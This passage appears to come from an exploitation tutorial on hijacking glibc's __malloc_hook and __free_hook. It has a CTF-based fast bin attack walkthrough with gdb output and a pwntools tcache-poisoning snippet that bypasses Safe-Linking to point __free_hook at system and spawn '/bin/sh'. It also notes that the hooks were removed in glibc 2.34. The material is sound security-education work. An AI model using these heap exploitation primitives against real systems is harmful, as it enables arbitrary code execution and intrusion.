  \nAs you can [Official GNU site](https://www.gnu.org/software/libc/manual/html_node/Hooks-for-Malloc.html), the variable\
  \ **`__malloc_hook`** is a pointer pointing to the **address of a function that will be called** whenever `malloc()` is\
  \ called **stored in the data section of the libc library**. Therefore, if this address is overwritten with a **One Gadget**\
  \ for example and `malloc` is called, the **One Gadget will be called**.\n\nTo call malloc it's possible to wait for the\
  \ program to call it or by **calling `printf(\"%10000$c\")`** which allocates too bytes many making `libc` calling malloc\
  \ to allocate them in the heap.\n\nMore info about One Gadget in:\n\n\n{{#ref}}\n../rop-return-oriented-programing/ret2lib/one-gadget.md\n\
  {{#endref}}\n\n> [!WARNING]\n> Note that hooks are **disabled for GLIBC >= 2.34**. There are other techniques that can be\
  \ used on modern GLIBC versions. See: [https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md](https://github.com/nobodyisnobody/docs/blob/main/code.execution.on.last.libc/README.md).\n\
  \n## Free Hook\n\nThis was abused in one of the example from the page abusing a fast bin attack after having abused an unsorted\
  \ bin attack:\n\n\n{{#ref}}\n../libc-heap/unsorted-bin-attack.md\n{{#endref}}\n\nIt's posisble to find the address of `__free_hook`\
  \ if the binary has symbols with the following command:\n\n```bash\ngef➤  p &__free_hook\n```\n\n[In the post](https://guyinatuxedo.github.io/41-house_of_force/bkp16_cookbook/index.html)\
  \ you can find a step by step guide on how to locate the address of the free hook without symbols. As summary, in the free\
  \ function:\n\n<pre class=\"language-armasm\"><code class=\"lang-armasm\">gef➤  x/20i free\n0xf75dedc0 <free>: push   ebx\n\
  0xf75dedc1 <free+1>: call   0xf768f625\n0xf75dedc6 <free+6>: add    ebx,0x14323a\n0xf75dedcc <free+12>:  sub    esp,0x8\n\
  0xf75dedcf <free+15>:  mov    eax,DWORD PTR [ebx-0x98]\n0xf75dedd5 <free+21>:  mov    ecx,DWORD PTR [esp+0x10]\n<strong>0xf75dedd9\
  \ <free+25>:  mov    eax,DWORD PTR [eax]--- BREAK HERE\n</strong>0xf75deddb <free+27>:  test   eax,eax ;<\n0xf75deddd <free+29>:\
  \  jne    0xf75dee50 <free+144>\n</code></pre>\n\nIn the mentioned break in the previous code in `$eax` will be located\
  \ the address of the free hook.\n\nNow a **fast bin attack** is performed:\n\n- First of all it's discovered that it's possible\
  \ to work with fast **chunks of size 200** in the **`__free_hook`** location:\n- <pre class=\"language-c\"><code class=\"\
  lang-c\">gef➤  p &__free_hook\n  $1 = (void (**)(void *, const void *)) 0x7ff1e9e607a8 <__free_hook>\n  gef➤  x/60gx 0x7ff1e9e607a8\
  \ - 0x59\n  <strong>0x7ff1e9e6074f: 0x0000000000000000      0x0000000000000200\n  </strong>0x7ff1e9e6075f: 0x0000000000000000\
  \      0x0000000000000000\n  0x7ff1e9e6076f <list_all_lock+15>:      0x0000000000000000      0x0000000000000000\n  0x7ff1e9e6077f\
  \ <_IO_stdfile_2_lock+15>: 0x0000000000000000      0x0000000000000000\n  </code></pre>\n  - If we manage to get a fast chunk\
  \ of size 0x200 in this location, it'll be possible to overwrite a function pointer that will be executed\n- For this, a\
  \ new chunk of size `0xfc` is created and the merged function is called with that pointer twice, this way we obtain a pointer\
  \ to a freed chunk of size `0xfc*2 = 0x1f8` in the fast bin.\n- Then, the edit function is called in this chunk to modify\
  \ the **`fd`** address of this fast bin to point to the previous **`__free_hook`** function.\n- Then, a chunk with size\
  \ `0x1f8` is created to retrieve from the fast bin the previous useless chunk so another chunk of size `0x1f8` is created\
  \ to get a fast bin chunk in the **`__free_hook`** which is overwritten with the address of **`system`** function.\n- And\
  \ finally a chunk containing the string `/bin/sh\\x00` is freed calling the delete function, triggering the **`__free_hook`**\
  \ function which points to system with `/bin/sh\\x00` as parameter.\n\n---\n\n## Tcache poisoning & Safe-Linking (glibc\
  \ 2.32 – 2.33)\n\nglibc 2.32 introduced **Safe-Linking** – an integrity-check that protects the *single*-linked lists used\
  \ by **tcache** and fast-bins. Instead of storing a raw forward pointer (`fd`), ptmalloc now stores it *obfuscated* with\
  \ the following macro:\n\n```c\n#define PROTECT_PTR(pos, ptr) (((size_t)(pos) >> 12) ^ (size_t)(ptr))\n#define REVEAL_PTR(ptr)\
  \       PROTECT_PTR(&ptr, ptr)\n```\n\nConsequences for exploitation:\n\n1. A **heap leak** is mandatory – the attacker\
  \ must know the runtime value of `chunk_addr >> 12` to craft a valid obfuscated pointer.\n2. Only the *full* 8-byte pointer\
  \ can be forged; single-byte partial overwrites will not pass the check.\n\nA minimal tcache-poisoning primitive that overwrites\
  \ `__free_hook` on glibc 2.32/2.33 therefore looks like:\n\n```py\nfrom pwn import *\n\nlibc = ELF(\"/lib/x86_64-linux-gnu/libc.so.6\"\
  )\np    = process(\"./vuln\")\n\n# 1. Leak a heap pointer (e.g. via UAF or show-after-free)\nheap_leak   = u64(p.recvuntil(b\"\
  \\n\")[:6].ljust(8, b\"\\x00\"))\nheap_base   = heap_leak & ~0xfff\nfd_key      = heap_base >> 12  # value used by PROTECT_PTR\n\
  log.success(f\"heap @ {hex(heap_base)}\")\n\n# 2. Prepare two same-size chunks and double-free one of them\na = malloc(0x48)\n\
  b = malloc(0x48)\nfree(a)\nfree(b)\nfree(a)           # tcache double-free ⇒ poisoning primitive\n\n# 3. Forge obfuscated\
  \ fd that points to __free_hook\nfree_hook = libc.sym['__free_hook']\npoison    = free_hook ^ fd_key\nedit(a, p64(poison))\
  \  # overwrite fd of tcache entry\n\n# 4. Two mallocs: the second one returns a pointer to __free_hook\nmalloc(0x48)   \
  \        # returns chunk a\nc = malloc(0x48)       # returns chunk @ __free_hook\nedit(c, p64(libc.sym['system']))\n\n#\
  \ 5. Trigger\nbin_sh = malloc(0x48)\nedit(bin_sh, b\"/bin/sh\\x00\")\nfree(bin_sh)\n```\n\nThe snippet above was adapted\
  \ from recent CTF challenges such as *UIUCTF 2024 – «Rusty Pointers»* and *openECSC 2023 – «Babyheap G»*, both of which\
  \ relied on Safe-Linking bypasses to overwrite `__free_hook`. \n\n---\n\n## What changed in glibc ≥ 2.34?\n\nStarting with\
  \ **glibc 2.34 (August 2021)** the allocation hooks `__malloc_hook`, `__realloc_hook`, `__memalign_hook` and `__free_hook`\
  \ were **removed from the public API and are no longer invoked by the allocator**. Compatibility symbols are still exported\
  \ for legacy binaries, but overwriting them no longer influences the control-flow of `malloc()` or `free()`. \n\nPractical\
  \ implication: on modern distributions (Ubuntu 22.04+, Fedora 35+, Debian 12, etc.) you must pivot to *other* hijack primitives\
  \ (IO-FILE, `__run_exit_handlers`, vtable spraying, etc.) because hook overwrites will silently fail.\n\nIf you still need\
  \ the old behaviour for debugging, glibc ships `libc_malloc_debug.so` which can be pre-loaded to re-enable the legacy hooks\
  \ – but the library is **not meant for production and may disappear in future releases**.\n\n---\n\n## References\n\n- [https://ir0nstone.gitbook.io/notes/types/stack/one-gadgets-and-malloc-hook](https://ir0nstone.gitbook.io/notes/types/stack/one-gadgets-and-malloc-hook)\n\
